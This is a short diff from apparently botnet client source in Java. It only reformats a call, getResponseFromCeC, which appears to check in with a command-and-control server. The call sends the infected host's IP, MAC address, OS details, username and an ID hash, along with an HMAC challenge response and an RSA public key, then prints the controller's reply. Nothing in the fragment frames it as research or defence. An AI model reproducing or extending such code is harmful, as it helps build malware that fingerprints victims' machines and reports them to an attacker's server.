@@ -84,9 +84,17 @@ public class Behavior {
 			String key = auth.generateStringKey(challenge.getValue2());
 			String hashMac = auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
 			System.out.println(hashMac);
-			String response = request.getResponseFromCeC(nServ.getIdHash(), nServ.getMyIp(), nServ.getMac(),
-					nServ.getOs(), nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(),
-					nServ.getCommandConquerIps().getList().get(0).getValue1(), hashMac, pki.getPubRSAKey(),
+			String response = request.getResponseFromCeC(
+					nServ.getIdHash(), 
+					nServ.getMyIp(), 
+					nServ.getMac(),
+					nServ.getOs(), 
+					nServ.getVersionOS(), 
+					nServ.getArchOS(), 
+					nServ.getUsernameOS(),
+					nServ.getCommandConquerIps().getList().get(0).getValue1(), 
+					hashMac, 
+					pki.getPubRSAKey(),
 					nServ.isElegible());
 			System.out.println("La risposta del CeC: " + response);
 		}
